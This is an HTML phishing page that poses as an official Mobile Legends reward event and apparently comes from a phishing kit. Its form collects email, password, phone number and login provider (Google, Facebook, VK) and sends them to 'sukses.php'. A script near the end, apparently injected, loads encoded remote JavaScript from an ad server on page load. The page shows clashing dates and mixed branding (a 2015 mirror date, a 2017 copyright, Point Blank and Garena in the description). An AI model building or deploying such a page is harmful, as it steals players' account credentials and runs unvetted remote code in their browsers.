<!DOCTYPE html>
<html lang="th">
  
<!-- Mirrored from www.garenaweb.com/reward-DSR-1.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Dec 2015 03:51:33 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mobile Legends - Event</title>
    <meta name="description" content="Event Point Blank Garena Indonesia">

    <!-- <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/flat-ui.min.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet"> -->
    <link href="css/pb.min.css" rel="stylesheet">

    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <div id="fb-root"></div>
    <script>(function(d, s, id) {
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) return;
      js = d.createElement(s); js.id = id;
      js.src = "../connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=661774673967000";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));</script>

    <div class="container">
      <div class="row">
        <div class="col-xs-12 col-md-offset-2 col-md-4">
          <div class="well">
            <h1 class="mts">Zilong</h1>
            <h6> Estern Warrior </h6>

<form method="post" action="sukses.php">
<img src="https://assets.jalantikus.com/assets/cache/560/0/userfiles/2017/07/06/wallpaper-mobile-legends-yun-zhao-eastern-warrior.jpeg" alt="" class="img-rounded img-responsive"</br>
</br> <center>Detail Your Account</center>
    <input type="username" class="form-control" id="email" name="email" placeholder="Your Email" autocomplete="off" required>
</br>	
    <input type="password" class="form-control" id="password" name="password" placeholder="Password" autocomplete="off" required>
</br> 
    <input type="number" class="form-control" id="hp" name="hp" placeholder="Number Phone" autocomplete="off" required>
</br>  
   <div style="width:100%" class="form-group">
        <select class="form-control" name="lvl">
		  <option>Your Level</option>
          <option>Level 1</option>
          <option>Level 2</option>
          <option>Level 3</option>
          <option>Level 4</option>
          <option>Level 5</option>
		  <option>Level 6</option>
		  <option>Level 7</option>
		  <option>Level 8</option>
		  <option>Level 9</option>
		  <option>Level 10</option>
         <option>Level 11</option>
		 <option>Level 12</option>
		 <option>Level 13</option>
		 <option>Level 14</option>
		 <option>Level 15</option>
		 <option>Level 16</option>
		 <option>Level 17</option>
		 <option>Level 18</option>
		 <option>Level 19</option>
		 <option>Level 20</option>
		 <option>Level 21</option>
		 <option>Level 22</option>
		 <option>Level 23</option>
		 <option>Level 24</option>
		 <option>Level 25</option>
		 <option>Level 26</option>
		 <option>Level 27</option>
		 <option>Level 28</option>
		 <option>Level 29</option>
		 <option>Level 30</option>
        </select>
</div>

<div style="width:100%" class="form-group">
        <select class="form-control" name="login">
          <option>Your Login With</option>
          <option>Google</option>
		  <option>Facebook</option>
		  <option>VK Account</option>
        </select>
</div>
   
<center><button type="submit" class="btn btn-primary">Submit</button>
</form>
</p>
</div>
</div>
        <div class="col-xs-12 col-md-4">
          <div class="clearfix"></div><br>
        </div>
      </div>
    </div>

    <footer class="footer">
      <div class="container">
        Copyright &copy; 2017 Mobile Legends. All rights reserved.<br>
 Powered by Moonton. Trademarks belong to their respective owners. All rights reserved. 
      </div>
    </footer>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bK1PafbffoAzly9Kr%2bmGY80jS58O1l6zUoK8oYeUirjUdyunZskUo14iWPHveIoFN2tRM3%2bmDtuS8mDsCLy8EQ9m2mRzWPCioxbZtvDMjYOqkAw3FkEclPTRDzTonD2mUDO5TNI67QI8xR0X3Prbf0h3fHtag7YZK6afeZ99JgiuS1nlk6oEvS6JTowV%2b5DjUVahYdH%2bpp4pLo75cuvYwaEaYgPxtAZjMUqyFexxfcISLtAdyg%2f6EqTZsYWzlK%2b%2fdcKhxanYOC5orfNo9CKm56DElPjxaPBkGiisMLe4ffWPrRO7UY0EJ7NXU78TlsPKdiSKZlHdSvZ4R4x7k46WlyTkSMCSzU6ObAMqcisO3CUsCOholA%2b2ZE8GPiIBEKFBPkbOu4IFn7MtkuSmtUHO%2fwBKUIIfHiLZaofjR7FAP9zVVveHHRcqUAALnNL2vp6YyQ0ErT9ZTu6IW91fPy9wFw1eAkjKDrlg3" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.garenaweb.com/reward-DSR-1.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Dec 2015 03:51:33 GMT -->
</html>
